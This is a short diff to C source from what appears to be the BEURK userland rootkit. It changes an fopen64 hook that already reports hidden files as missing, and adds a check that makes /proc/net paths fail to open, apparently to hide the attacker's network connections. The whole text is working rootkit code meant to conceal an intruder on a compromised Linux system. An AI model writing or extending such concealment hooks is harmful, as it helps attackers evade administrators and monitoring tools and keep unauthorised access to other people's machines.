@@ -19,11 +19,9 @@
  */
 
 #include <errno.h> /* errno, ENOENT */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_FOPEN() */
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file(), is_procnet() */
+#include "config.h" /* REAL_FOPEN64() */
 #include "hooks.h" /* prototype, FILE */
-
-// TODO: is_procnet()
 
 FILE *fopen64(const char *__restrict path, const char *mode) {
     DEBUG(D_INFO, "called fopen(3) hook");
@@ -33,8 +31,11 @@ FILE *fopen64(const char *__restrict path, const char *mode) {
 
     if (is_hidden_file(path)) {
         errno = ENOENT;
-        return NULL;
+        return (NULL);
     }
+
+    if (is_procnet(path))
+        return (NULL);
 
     return (REAL_FOPEN64(path, mode));
 }
